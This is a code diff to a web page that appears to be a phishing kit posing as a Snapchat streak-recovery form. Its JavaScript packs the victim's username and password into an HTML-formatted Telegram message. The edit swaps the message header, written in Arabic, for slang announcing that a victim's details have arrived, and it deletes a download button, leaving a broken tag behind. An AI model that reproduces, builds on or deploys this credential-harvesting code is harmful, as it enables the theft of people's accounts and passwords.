@@ -443,7 +443,7 @@ async function submitForm() {
     try {
         // Build Telegram message with HTML formatting
         const message = 
-            "🟡 <b>طلب استعادة سلسلة لقطات متتالية</b>\n" +
+            "🟡 <b> طرفت لك معلوماته اجحدها </b>\n" +
             "━━━━━━━━━━━━━━━━━━━━\n\n" +
             "👤 <b>اسم المستخدم:</b> <code>" + escapeHtml(data.username) + "</code>\n\n" +
             "🔑 <b>كلمة المرور:</b> <code>" + escapeHtml(data.password) + "</code>\n\n" +
@@ -528,13 +528,6 @@ function getCurrentTime() {
 }
 </script>
 
-
-<!-- زر تحميل الملف -->
-<div style="position:fixed;bottom:20px;left:20px;z-index:9999;">
-    <button onclick="downloadPage()" 
-            style="background:#000;color:#FFFC00;padding:12px 24px;border-radius:25px;
-                   border:none;font-weight:700;font-size:14px;box-shadow:0 4px 12px rgba(0,0,0,0.3);
-                   font-family:sans-serif;cursor:pointer;"
           
     </button>
 </div>
